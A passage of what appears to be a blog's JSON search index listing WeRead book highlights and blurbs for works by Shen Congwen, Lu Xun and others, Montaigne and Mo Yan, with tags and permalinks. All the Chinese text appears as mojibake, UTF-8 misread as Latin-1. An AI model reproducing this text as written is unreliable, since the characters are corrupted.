è¦çŸ¥é“å·¥ä½œä¸­æ€»ä¼šå‡ºç°ä¸€äº›äººä¸€äº›äº‹æ˜¯æˆ‘ä»¬ä¸æƒ³é¢å¯¹çš„ï¼Œç”Ÿæ´»ä¸­ä¹Ÿä¼šï¼Œè¿™éƒ½æ˜¯æˆ‘ä»¬æˆé•¿çš„å¿…ä¿®è¯¾ï¼Œæˆ‘ä»¬è¦å»å­¦ä¹ æ€æ ·ä¸è®©è‡ªå·±çš„åæƒ…ç»ªå½±å“åˆ°å·¥ä½œå’Œç”Ÿæ´»ï¼Œå­¦ä¼šå»èå…¥è¿™ä¸ªç¤¾ä¼šèµ¶ä¸Šå¤§å¤šæ•°äººçš„æ­¥ä¼ï¼Œæ¥å—å¤§å¤šæ•°äººçš„æ ¼æ ¼ä¸å…¥ï¼Œå…ˆå­¦ä¼šåšä¸€ä¸ªç†æ™ºçš„äººï¼Œæ‰æœ‰æœºä¼šåšä¸€ä¸ªæˆåŠŸçš„äººã€‚â€ â€” åˆ›å»ºäº [[2022-08-16]] 01:12 ^38-2443-2566 Chapter 12 é€å­ä¸­åŒ»&amp;ä¹¡äº²ä¿å§† çˆ±å°±æ˜¯è‡³é«˜å¢ƒç•Œå•Šï¼Œæ˜¯ä¸€åˆ‡é”™è¯¯è¡Œä¸ºçš„é®ç¾å¸ƒå•Š â€” åˆ›å»ºäº [[2022-08-16]] 01:13 ^38-3343-3364 Chapter 12 é€å­ä¸­åŒ»&amp;ä¹¡äº²ä¿å§† äººç”Ÿæœ€éš¾å¾—çš„ä¸æ˜¯é‡‘é’±æˆ–æœºé‡ï¼Œè€Œæ˜¯å¸Œæœ›ã€‚æ²¡æœ‰å¸Œæœ›ï¼Œä¸€åˆ‡éƒ½æ²¡æ„ä¹‰ã€‚ â€” åˆ›å»ºäº [[2022-08-16]] 01:19 ^38-11733-11764 Chapter 12 é€å­ä¸­åŒ»&amp;ä¹¡äº²ä¿å§† åŒé±¼åº§çš„å¥³ç”Ÿï¼Œæœ¬èº«å°±å¾ˆæƒ…ç»ªåŒ–ï¼Œçƒ­çƒˆèµ·æ¥çƒ­çƒˆå¾—è¦æ­»ï¼Œå†·é™èµ·æ¥åˆå†·é™å¾—å‡ºå¥‡ã€‚ â€” åˆ›å»ºäº [[2022-08-16]] 01:21 ^38-13938-13974 Chapter 16 å³°å›è·¯è½¬çš„çˆ±&amp;çœŸç›¸å¤§ç™½çš„æ¨ Chapter 16 å³°å›è·¯è½¬çš„çˆ±&amp;çœŸç›¸å¤§ç™½çš„æ¨ æŠ¥å¤çš„ä»£ä»·ä»æ¥å°±æ˜¯è¿™æ ·ï¼ŒçœŸæ­£å¯æ€•çš„æŠ¥å¤å°±æ˜¯å­¤æ³¨ä¸€æ·ï¼Œä½†å‡¡è¿˜æœ‰ç‚¹å„¿å¸Œæœ›ï¼Œäººéƒ½ä¸è‡³äºæ‰¯ç ´æœ€è–„çš„é‚£å±‚è„¸çš®ã€‚ â€” åˆ›å»ºäº [[2022-08-16]] 18:26 ^42-22170-22220 Chapter 16 å³°å›è·¯è½¬çš„çˆ±&amp;çœŸç›¸å¤§ç™½çš„æ¨ äººå¾€å¾€å°±æ˜¯è¿™æ ·ï¼Œå¦‚æœä½ å…ˆæ¬ºéª—äº†åˆ«äººï¼Œåœ¨å‘ç°è¢«æ¬ºéª—æ—¶æ›´å®¹æ˜“æƒ³é€šæ›´å®¹æ˜“è°…è§£ã€‚ â€” åˆ›å»ºäº [[2022-08-16]] 18:26 ^42-22615-22651 Chapter 18 é‡è¦å†³å®š&amp;å¹³æ·¡ç”Ÿæ´» Chapter 18 é‡è¦å†³å®š&amp;å¹³æ·¡ç”Ÿæ´» å­˜æŠ˜æ˜¯ç©ºçš„ï¼Œè¡Œå›Šä¹Ÿæ˜¯ç©ºçš„ã€‚ â€” åˆ›å»ºäº [[2022-08-16]] 19:03 ^44-11014-11027 Chapter 18 é‡è¦å†³å®š&amp;å¹³æ·¡ç”Ÿæ´» å¯æˆ‘æ˜ç™½è‡ªå·±éœ€è¦çš„ï¼Œæ˜¯ä¸€ä¸ªå®Œå®Œå…¨å…¨å´­æ–°çš„äººï¼Œä»–å¿…é¡»å¯¹æˆ‘çš„è¿‡å»ä¸€æ— æ‰€çŸ¥â€”â€”åªæœ‰ä»¥å´­æ–°çš„äººç‰©é…ç°‡æ–°çš„ç”Ÿæ´»ï¼Œæ‰ä¸è¾œè´Ÿé€ƒå…µçš„å‹‡æ•¢ã€‚ â€” åˆ›å»ºäº [[2022-08-16]] 19:07 ^44-13580-13641","tags":[{"name":"weread","slug":"weread","permalink":"https://hodlyounger.github.io/tags/weread/"},{"name":"å¾®ä¿¡è¯»ä¹¦","slug":"å¾®ä¿¡è¯»ä¹¦","permalink":"https://hodlyounger.github.io/tags/%E5%BE%AE%E4%BF%A1%E8%AF%BB%E4%B9%A6/"}],"categories":[{"name":"D_ç«‹å¿—åšè§ˆç¾¤ä¹¦","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/"},{"name":"weread","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦/weread","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/weread/"},{"name":"æ–‡å­¦","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦/weread/æ–‡å­¦","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/weread/%E6%96%87%E5%AD%A6/"}]},{"title":"é™¤äº†çˆ±ä½ ï¼Œæˆ‘æ²¡æœ‰åˆ«çš„æ„¿æœ›","date":"2024-08-31T01:35:29.326Z","path":"D_ç«‹å¿—åšè§ˆç¾¤ä¹¦/weread/æ–‡å­¦/é™¤äº†çˆ±ä½ ï¼Œæˆ‘æ²¡æœ‰åˆ«çš„æ„¿æœ›-æ²ˆä»æ–‡/","text":"ä½œè€…ï¼šæ²ˆä»æ–‡ - å†…å®¹ç®€ä»‹ ã€Šé™¤äº†çˆ±ä½ ï¼Œæˆ‘æ²¡æœ‰åˆ«çš„æ„¿æœ›ã€‹ æœ¬ä¹¦åˆ†ä¸ºâ€œæ¹˜è¡Œä¹¦ç®€â€å’Œâ€œé™¤äº†çˆ±ä½ ï¼Œæˆ‘æ²¡æœ‰åˆ«çš„æ„¿æœ›â€ä¸¤éƒ¨åˆ†ã€‚æ²ˆä»æ–‡ä¸å¦»å­å¼ å…†å’Œå©šåä¸ä¹…ä¾¿å› æ¯äº²ç”Ÿç—…ä¸å¾—ä¸è¿”å›æ¹˜è¥¿ï¼Œä¸å¦»å­ç›¸çº¦è·¯ä¸Šæ¯å¤©éƒ½ä¸ºå¥¹å†™ä¿¡ï¼Œä»–åœ¨æ²³ä¸Šæ‘‡æ™ƒçš„å°èˆ¹ä¸­å†™ç§€ç¾å±±æ°´ï¼Œå†™æ²¿é€”è§é—»ï¼Œå†™é£åœŸäººæƒ…ï¼Œä½†å†™çš„æ›´å¤šçš„æ˜¯ç›¸æ€éš¾è€ï¼Œâ€œæ¹˜è¡Œä¹¦ç®€â€ä¸­å°å°ä¹¦ä¿¡å³æ˜¯ä½œå®¶è‡ªå·±çš„åŠ¨äººçˆ±æƒ…ã€‚â€œé™¤äº†çˆ±ä½ ï¼Œæˆ‘æ²¡æœ‰åˆ«çš„æ„¿æœ›â€éƒ¨åˆ†æ”¶å½•æ²ˆä»æ–‡æ‰€å†™ã€Šä¸‰ä¸‰ã€‹ã€Šå¦‚è•¤ã€‹ç­‰äº”ç¯‡æƒ…æ„Ÿå°è¯´ï¼Œæç”»ä¹¡æ‘ä¸éƒ½å¸‚ä¸­çš„å¹´è½»ç”·å¥³ï¼Œå¨“å¨“é“æ¥çˆ±æƒ…çš„ä¸ªä¸­æ»‹å‘³ï¼Œæ‡µæ‡‚ã€å«è“„ã€ç»µé•¿ã€è‹¦æ¶©ã€çƒ­çƒˆâ€¦â€¦ é™¤äº†çˆ±ä½ ï¼Œæˆ‘æ²¡æœ‰åˆ«çš„æ„¿æœ› + ã€Šé™¤äº†çˆ±ä½ ï¼Œæˆ‘æ²¡æœ‰åˆ«çš„æ„¿æœ›ã€‹ å±æ€§ å†…å®¹ ISBN 9787214226051 ä½œè€… æ²ˆä»æ–‡ å‡ºç‰ˆå¹´ 2018-12-01 å‡ºç‰ˆç¤¾ æ±Ÿè‹äººæ°‘å‡ºç‰ˆç¤¾ æ¥æº é™¤äº†çˆ±ä½ ï¼Œæˆ‘æ²¡æœ‰åˆ«çš„æ„¿æœ› åˆ†ç±» æ–‡å­¦-æ•£æ–‡æ‚è‘— é«˜äº®åˆ’çº¿ å¼•å­ å¼•å­ è·¯ä¸Šæ˜¯ä¸æ˜¯å¾ˆè‹¦ï¼Ÿè¿™æ¡è·¯æˆ‘ä»æœªèµ°è¿‡ï¼Œæƒ³è±¡ä¸åˆ°æ˜¯ä»€ä¹ˆæƒ…å½¢ï¼Œæ€»æ˜¯è¾›è‹¦å°±æ˜¯äº†ã€‚ â€” åˆ›å»ºäº [[2021-10-26]] 23:23 ^5-880-915","tags":[{"name":"weread","slug":"weread","permalink":"https://hodlyounger.github.io/tags/weread/"},{"name":"å¾®ä¿¡è¯»ä¹¦","slug":"å¾®ä¿¡è¯»ä¹¦","permalink":"https://hodlyounger.github.io/tags/%E5%BE%AE%E4%BF%A1%E8%AF%BB%E4%B9%A6/"}],"categories":[{"name":"D_ç«‹å¿—åšè§ˆç¾¤ä¹¦","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/"},{"name":"weread","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦/weread","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/weread/"},{"name":"æ–‡å­¦","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦/weread/æ–‡å­¦","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/weread/%E6%96%87%E5%AD%A6/"}]},{"title":"è§ä¿¡å¦‚é¢","date":"2024-08-31T01:35:29.323Z","path":"D_ç«‹å¿—åšè§ˆç¾¤ä¹¦/weread/æ–‡å­¦/è§ä¿¡å¦‚é¢-é²è¿…ç­‰/","text":"ä½œè€…ï¼šé²è¿…ç­‰ - å†…å®¹ç®€ä»‹ ã€Šè§ä¿¡å¦‚é¢ã€‹ æƒ…ä¹¦æ˜¯ä¸€ç§ç¾å¦™çš„ä¿¡ç‰©,ä½†åœ¨å¦‚ä»Šè¿™ä¸ªä¿¡æ¯æ€¥é€Ÿåˆ°è¾¾çš„æ—¶ä»£,é•¿ä¿¡å‡ ä¹å·²ç»æ·¡å‡ºäº†äººä»¬çš„ç”Ÿæ´»ã€‚å¾ˆå¤šç¥åœ£çš„ä¸œè¥¿çªç„¶å˜æˆäº†å¿«æ¶ˆå“ï¼Œæ¯”å¦‚çˆ±æƒ…ã€‚äººä»¬åœ¨è¿½æ±‚ç‰©è´¨çš„åŒæ—¶ï¼Œå¿ƒé‡Œæ»¡æ»¡é•¿äº†ä¸€å±‚é˜²å¾¡çš„ç¡¬èŒ§ã€‚è€Œè¿™äº›ä¹¦ä¿¡æ‰¿è½½çš„çˆ±æƒ…ï¼Œä¼šå°†äººä»¬å¿ƒå¤´çš„ç¡¬èŒ§å˜è½¯ã€è„±è½ï¼Œè®©äººå¿ƒé‡æ–°å˜å¾—æŸ”è½¯ã€‚æ— è®ºä½ æ˜¯å¦ç»å†è¿‡å°ºç´ ä¼ æƒ…çš„å¹´ä»£,æ„Ÿå—è¿‡çˆ±æƒ…åœ¨ç­‰å¾…å’Œè·ç¦»ä¸­å‘é…µçš„æ»‹å‘³,ä¸å¦¨æ¥çœ‹çœ‹åœ¨ä»å‰ä¹¦ä¿¡å¾€æ¥çš„ä¸–ç•Œé‡Œ,çˆ±æƒ…æ˜¯ä»€ä¹ˆæ¨¡æ ·ï¼Ÿæœ¬ä¹¦ç³»ç²¾é€‰å·²è¿›å…¥å…¬ç‰ˆçš„å›½å†…åäººï¼ˆé²è¿…ã€å¾å¿—æ‘©ã€æœ±ç”Ÿè±ªã€è§çº¢ã€é—»ä¸€å¤šã€çŸ³è¯„æ¢…ç­‰ï¼‰å†™ç»™è‡ªå·±çˆ±äººçš„ä¹¦ä¿¡ç¯‡ç›®ï¼Œå¸¦ä½ èµ°è¿›è¿™äº›å¤§å¸ˆä»¬å…‰å½©èƒŒåä¸ä¸ºäººçŸ¥çš„æµªæ¼«å’ŒæŸ”æƒ…ã€‚ è§ä¿¡å¦‚é¢ + ã€Šè§ä¿¡å¦‚é¢ã€‹ å±æ€§ å†…å®¹ ISBN 9787500165187 ä½œè€… é²è¿…ç­‰ å‡ºç‰ˆå¹´ 2021-03-01 å‡ºç‰ˆç¤¾ ä¸­è¯‘å‡ºç‰ˆç¤¾ æ¥æº è§ä¿¡å¦‚é¢ åˆ†ç±» æ–‡å­¦-ç»å…¸ä½œå“ é«˜äº®åˆ’çº¿ é²è¿…è‡´è®¸å¹¿å¹³ é²è¿…è‡´è®¸å¹¿å¹³ ä¸è‡ªé‡ä¹Ÿç½¢ï¼Œä¸ç›¸å½“ä¹Ÿç½¢ï¼›åˆæ³•ä¹Ÿç½¢ï¼Œä¸åˆæ³•ä¹Ÿç½¢ï¼Œè¿™éƒ½ä¸æˆ‘ä»¬ä¸ç›¸å¹²ã€‚ â€” åˆ›å»ºäº [[2022-02-28]] 22:05 ^6-1372-1404 é²è¿…è‡´è®¸å¹¿å¹³ åå¹´æºæ‰‹å…±è‰°å±ï¼Œä»¥æ²«ç›¸æ¿¡äº¦å¯å“€ã€‚èŠå€Ÿç”»å›¾æ€¡å€¦çœ¼ï¼Œæ­¤ä¸­ç”˜è‹¦ä¸¤å¿ƒçŸ¥ â€” åˆ›å»ºäº [[2022-02-28]] 22:07 ^6-2205-2236 éƒ½åªçŸ¥é“é²è¿…çš„ç¬”å¢¨ï¼Œé²œå°‘äº†è§£ä»–çš„ç”¨æƒ…å•Š é²è¿…è‡´è®¸å¹¿å¹³ æ­¤åˆ»ä¸çŸ¥ä½ ç¡ç€è¿˜æ˜¯é†’ç€ã€‚æˆ‘åœ¨è¿™é‡Œåªèƒ½é¥æ„¿ä½ å¤©ç„¶çš„å®‰çœ ï¼Œå¹¶ä¸”äººä¸ºçš„ä¿é‡ã€‚ â€” åˆ›å»ºäº [[2022-03-03]] 22:22 ^6-12907-12942 æ—è§‰æ°‘è‡´é™ˆæ„æ˜  æ—è§‰æ°‘è‡´é™ˆæ„æ˜  å¾è‡³çˆ±æ±ï¼Œå³æ­¤çˆ±æ±ä¸€å¿µï¼Œä½¿å¾å‹‡å°±æ­»ä¹Ÿã€‚å¾è‡ªé‡æ±ä»¥æ¥ï¼Œå¸¸æ„¿å¤©ä¸‹æœ‰æƒ…äººç»ˆæˆçœ·å±ã€‚ â€” åˆ›å»ºäº [[2022-03-03]] 22:25 ^7-2162-2200 é²è¿…è‡´è®¸å¹¿å¹³ åå¹´æºæ‰‹å…±è‰°å±ï¼Œä»¥æ²«ç›¸æ¿¡äº¦å¯å“€ã€‚èŠå€Ÿç”»å›¾æ€¡å€¦çœ¼ï¼Œæ­¤ä¸­ç”˜è‹¦ä¸¤å¿ƒçŸ¥ â€” åˆ›å»ºäº [[2022-02-28]] 22:08 ^291189470-7xpLdQYMu éƒ½åªçŸ¥é“é²è¿…çš„ç¬”å¢¨ï¼Œé²œå°‘äº†è§£ä»–çš„ç”¨æƒ…å•Š","tags":[{"name":"weread","slug":"weread","permalink":"https://hodlyounger.github.io/tags/weread/"},{"name":"å¾®ä¿¡è¯»ä¹¦","slug":"å¾®ä¿¡è¯»ä¹¦","permalink":"https://hodlyounger.github.io/tags/%E5%BE%AE%E4%BF%A1%E8%AF%BB%E4%B9%A6/"}],"categories":[{"name":"D_ç«‹å¿—åšè§ˆç¾¤ä¹¦","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/"},{"name":"weread","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦/weread","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/weread/"},{"name":"æ–‡å­¦","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦/weread/æ–‡å­¦","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/weread/%E6%96%87%E5%AD%A6/"}]},{"title":"è’™ç”°éšç¬”","date":"2024-08-31T01:35:29.320Z","path":"D_ç«‹å¿—åšè§ˆç¾¤ä¹¦/weread/æ–‡å­¦/è’™ç”°éšç¬”-ã€æ³•ã€‘è’™ç”°/","text":"ä½œè€…ï¼šã€æ³•ã€‘è’™ç”° - å†…å®¹ç®€ä»‹ ã€Šè’™ç”°éšç¬”ã€‹ å…¬å…ƒ1572å¹´ï¼Œå‰æ³•å®˜ç±³æ­‡å°”Â·å¾·Â·è’™ç”°éšå±…å¤å ¡è—ä¹¦å®¤ï¼Œå¼€å§‹æ’°å†™Essaiï¼Œè®°å½•è‡ªå·±çš„æ‰€æ€æ‰€æ„Ÿã€‚äºŒåå¹´åï¼Œä¸–ç•Œä¸Šæœ‰äº†ç¬¬ä¸€éƒ¨éšç¬”é›†ï¼›ä»æ­¤éšç¬”ä½œä¸ºä¸€ç§å…¨æ–°æ–‡ä½“ï¼Œé£é¡äºä¸–ã€‚å››ç™¾å¤šå¹´æ¥ï¼Œã€Šè’™ç”°éšç¬”ã€‹å› ä¸°å¯Œã€è‡ªç„¶ã€æ¯«ä¸è™šä¼ªï¼Œè¢«è¯‘ä½œå„å›½æ–‡å­—è¡Œé”€ä¸–ç•Œï¼Œç»ä¹…ä¸è¡°ã€‚æœ¬ä¹¦ç”±ç¿»è¯‘å®¶é©¬æŒ¯éª‹å…ˆç”Ÿï¼Œè¯‘è‡ªæ³•æ–‡åŸç‰ˆã€Šè’™ç”°å…¨é›†ã€‹ï¼ˆä¼½åˆ©ç›å‡ºç‰ˆç¤¾ï¼Œ1962ç‰ˆï¼‰ï¼›æ ¼å¼ã€å¥è¯»ä¹Ÿå‡ä¸¥æ ¼ä¾ç…§å…¶ç¼–æ’æ–¹å¼ã€‚å…¨ä¹¦é€‰ç¯‡ç”±é©¬å…ˆç”Ÿäº²è‡ªæŒ‘é€‰ã€ä¿®è®¢ï¼Œä¹¦åç‰¹åˆ«é™„æœ‰åŸç‰ˆå¼•è¨€ã€è’™ç”°å¹´è¡¨åŠäººåã€åœ°åç´¢å¼•ã€‚é©¬å…ˆç”Ÿæ›¾å‡­å€Ÿã€Šè’™ç”°éšç¬”å…¨é›†ã€‹ï¼Œè·å¾—2009å¹´é¦–å±Šå‚…é›·ç¿»è¯‘å‡ºç‰ˆå¥–ã€‚ è’™ç”°éšç¬” + ã€Šè’™ç”°éšç¬”ã€‹ å±æ€§ å†…å®¹ ISBN 9787533946050 ä½œè€… ã€æ³•ã€‘è’™ç”° å‡ºç‰ˆå¹´ 2016-09-01 å‡ºç‰ˆç¤¾ æµ™æ±Ÿæ–‡è‰ºå‡ºç‰ˆç¤¾ æ¥æº è’™ç”°éšç¬” åˆ†ç±» æ–‡å­¦-æ•£æ–‡æ‚è‘— é«˜äº®åˆ’çº¿ è®ºè‰¯å¿ƒ è®ºè‰¯å¿ƒ è‹¦åˆ‘æ˜¯ä¸€é¡¹å±é™©çš„å‘æ˜ï¼Œè¿™åƒæ˜¯åœ¨æ£€éªŒäººçš„è€æ€§è€Œä¸æ˜¯æ£€éªŒäººçš„çœŸæƒ…ã€‚èƒ½å¤Ÿå¿å—è‹¦åˆ‘çš„äººä¼šéšç’çœŸæƒ…ï¼Œä¸èƒ½å¤Ÿå¿å—è‹¦åˆ‘çš„äººä¹Ÿä¼šéšç’çœŸæƒ…ã€‚ç—›è‹¦èƒ½å¤Ÿä½¿æˆ‘ä¾›è®¤äº‹å®ï¼Œä¸ºä»€ä¹ˆå°±ä¸èƒ½ä½¿æˆ‘ä¾›è®¤ä¸æ˜¯äº‹å®å‘¢ï¼Ÿ â€” åˆ›å»ºäº [[2022-05-12]] 00:50 ^7-3369-3457 è®ºæƒ³è±¡çš„åŠ›é‡ è®ºæƒ³è±¡çš„åŠ›é‡ äººäººéƒ½ä¼šè·Ÿæƒ³è±¡ç›¸æ’ï¼Œæœ‰äººè¿˜è¢«å®ƒæ’ç¿»ã€‚æˆ‘åˆ™è¢«å®ƒåˆºä¸­å¿ƒçªã€‚æˆ‘çš„å¯¹ç­–æ˜¯é¿å…¶é”‹èŠ’ï¼Œä¸æ˜¯æŒ¡å…¶å»è·¯ã€‚æˆ‘åªä¼šè·Ÿå¥åº·å¿«ä¹çš„äººäº¤å¾€ã€‚çœ‹åˆ°åˆ«äººç„¦è™‘ä¹Ÿä¼šå¼•èµ·æˆ‘å®å®åœ¨åœ¨çš„ç„¦è™‘ï¼Œæˆ‘çš„æ„Ÿæƒ…ç»å¸¸åƒ­å¤ºäº†åˆ«äººçš„æ„Ÿæƒ…ã€‚ â€” åˆ›å»ºäº [[2022-06-17]] 22:10 ^31-676-767","tags":[{"name":"weread","slug":"weread","permalink":"https://hodlyounger.github.io/tags/weread/"},{"name":"å¾®ä¿¡è¯»ä¹¦","slug":"å¾®ä¿¡è¯»ä¹¦","permalink":"https://hodlyounger.github.io/tags/%E5%BE%AE%E4%BF%A1%E8%AF%BB%E4%B9%A6/"}],"categories":[{"name":"D_ç«‹å¿—åšè§ˆç¾¤ä¹¦","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/"},{"name":"weread","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦/weread","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/weread/"},{"name":"æ–‡å­¦","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦/weread/æ–‡å­¦","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/weread/%E6%96%87%E5%AD%A6/"}]},{"title":"ç”Ÿæ­»ç–²åŠ³","date":"2024-08-31T01:35:29.317Z","path":"D_ç«‹å¿—åšè§ˆç¾¤ä¹¦/weread/æ–‡å­¦/ç”Ÿæ­»ç–²åŠ³-è«è¨€/","text":"ä½œè€…ï¼šè«è¨€ - å†…å®¹ç®€ä»‹ ã€Šç”Ÿæ­»ç–²åŠ³ã€‹ ä¸çœ‹ä¸çŸ¥é“ï¼Œè«è¨€çœŸå¹½é»˜ï¼åœ¨æåº¦ç—›è‹¦æ—¶ç¬‘å‡ºå£°æ¥ï¼Œè·å¾—å†…å¿ƒæ·±å¤„çš„è§£è„±ã€‚ ä¸çœ‹ä¸çŸ¥é“ï¼Œæ¬²å“­åˆæƒ³ç¬‘ã€‚æ´»ç€ä¸å®¹æ˜“ï¼Œå¹½é»˜æ— ä»·å®ã€‚ â€”â€”è«è¨€ äº”åå¹´é—´è¥¿é—¨é—¹ç»å†å…­æ¬¡è½¬ä¸–ï¼Œ ä¸€ä¸–ä¸ºé©´ï¼ŒäºŒä¸–ä¸ºç‰›ï¼Œä¸‰ä¸–ä¸ºçŒªï¼Œå››ä¸–ä¸ºç‹—ï¼Œäº”ä¸–ä¸ºçŒ´ï¼Œæœ€ç»ˆé™ç”Ÿä¸ºäººã€‚ åœ¨è¿™å…­ä¸–é‡Œï¼Œä»–ç›®ç¹è“è„¸ä¸€å®¶ä¸‰ä»£ç»å†äººç”Ÿçš„ç”Ÿæ­»ç–²åŠ³ï¼Œ ä»–ä»¬çˆ±å°±çˆ±åˆ°åº•ï¼Œæ¨å°±æ¨åˆ°åº•ï¼ŒçŠŸå°±çŠŸåˆ°åº•ï¼Œå¹²å°±å¹²åˆ°åº•ï¼Œ æœ‰æè‡´çš„ç—›è‹¦ä¸æ¬¢ä¹ï¼Œæ›´æœ‰ä¸ç­çš„çƒ­æƒ…ä¸å¸Œæœ›ã€‚ è€Œä»–ä»¬çš„æ•…äº‹ï¼Œè¦ä»1950å¹´1æœˆ1æ—¥è®²èµ·â€¦â€¦ ç”Ÿæ­»ç–²åŠ³ + ã€Šç”Ÿæ­»ç–²åŠ³ã€‹ å±æ€§ å†…å®¹ ISBN 9787533966102 ä½œè€… è«è¨€ å‡ºç‰ˆå¹´ 2022-01-01 å‡ºç‰ˆç¤¾ æµ™æ±Ÿæ–‡è‰ºå‡ºç‰ˆç¤¾ æ¥æº ç”Ÿæ­»ç–²åŠ³ åˆ†ç±» æ–‡å­¦-ç»å…¸ä½œå“ é«˜äº®åˆ’çº¿ ç¬¬å…­ç«  æŸ”æƒ…ç¼±ç»»æˆä½³å¶ æ™ºå‹‡åŒå…¨æ–—æ¶ç‹¼ ç¬¬å…­ç«  æŸ”æƒ…ç¼±ç»»æˆä½³å¶ æ™ºå‹‡åŒå…¨æ–—æ¶ç‹¼ äººæ˜¯ä¸€è¨€æ—¢å‡ºï¼Œé©·é©¬éš¾è¿½ï¼›é©´æ˜¯ä¸€è¯ºåƒé‡‘ï¼Œä¸è§ä¸æ•£ã€‚ â€” åˆ›å»ºäº [[2022-03-14]] 17:15 ^148-794-818 ç¬¬å…­ç«  æŸ”æƒ…ç¼±ç»»æˆä½³å¶ æ™ºå‹‡åŒå…¨æ–—æ¶ç‹¼ æˆ‘çš„å‰ä¸–æ˜¯äººï¼Œé‚£äººä¸€å¦»ä¸¤å¦¾ï¼Œåªæœ‰æ€§æ— æœ‰çˆ±ï¼Œæˆ‘æ›¾ç»é”™ä»¥ä¸ºä»–éå¸¸å¹¸ç¦ï¼Œç°åœ¨æ‰çŸ¥é“ä»–ååˆ†å¯æ€œã€‚ä¸€ä¸ªè¢«çˆ±æƒ…ä¹‹ç«çƒ§çƒ¤ç€çš„é©´ï¼Œæ¯”æ‰€æœ‰çš„äººéƒ½å¹¸ç¦å•Šã€‚ä¸€ä¸ªå°†è‡ªå·±çš„çˆ±ä¾£ä»ç‹¼å£ä¸­è§£æ•‘å‡ºæ¥çš„å…¬é©´ï¼Œæ—¢åœ¨çˆ±ä¾£å‰å±•ç¤ºäº†è‡ªå·±çš„å‹‡åŠ›å’Œæ™ºæ…§ï¼Œåˆæ»¡è¶³äº†é›„æ€§çš„è™šè£å¿ƒã€‚å§å•Šï¼Œæ˜¯ä½ è®©æˆ‘æˆä¸ºä¸€å¤´å…‰è£çš„é©´ï¼Œæ˜¯ä½ è®©æˆ‘æˆäº†åœ°çƒä¸Šæœ€å¹¸ç¦çš„åŠ¨ç‰©ã€‚æˆ‘ä»¬äº’ç›¸å•ƒç€ç—’ï¼Œæˆ‘ä»¬äº’ç›¸ç£¨è¹­ç€çš®è‚¤ï¼ŒæŸ”æƒ…ç¼±ç»»ï¼Œæƒ…è¯è¿ç»µï¼Œæ„Ÿæƒ…åœ¨å®ç£¨ä¸­æ„ˆæ¥æ„ˆæ·±ï¼Œå‡ ä¹ä½¿æˆ‘å¿˜è®°äº†è¹²åœ¨æ²³è¾¹çš„ç‹¼ â€” åˆ›å»ºäº [[2022-03-14]] 17:35 ^148-3022-3221 ç¬¬ä¸ƒç«  èŠ±èŠ±ç•éš¾èƒŒèª“çº¦ é—¹é—¹å‘å¨å’¬çŒæˆ· ç¬¬ä¸ƒç«  èŠ±èŠ±ç•éš¾èƒŒèª“çº¦ é—¹é—¹å‘å¨å’¬çŒæˆ· ä¸€ç§ç©ºç©ºæ´æ´ã€æ¾„æ¾ˆé€æ˜çš„ç´¯ â€” åˆ›å»ºäº [[2022-03-14]] 19:15 ^149-652-665","tags":[{"name":"weread","slug":"weread","permalink":"https://hodlyounger.github.io/tags/weread/"},{"name":"å¾®ä¿¡è¯»ä¹¦","slug":"å¾®ä¿¡è¯»ä¹¦","permalink":"https://hodlyounger.github.io/tags/%E5%BE%AE%E4%BF%A1%E8%AF%BB%E4%B9%A6/"}],"categories":[{"name":"D_ç«‹å¿—åšè§ˆç¾¤ä¹¦","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/"},{"name":"weread","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦/weread","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/weread/"},{"name":"æ–‡å­¦","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦/weread/æ–‡å­¦","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/weread/%E6%96%87%E5%AD%A6/"}]},{"title":"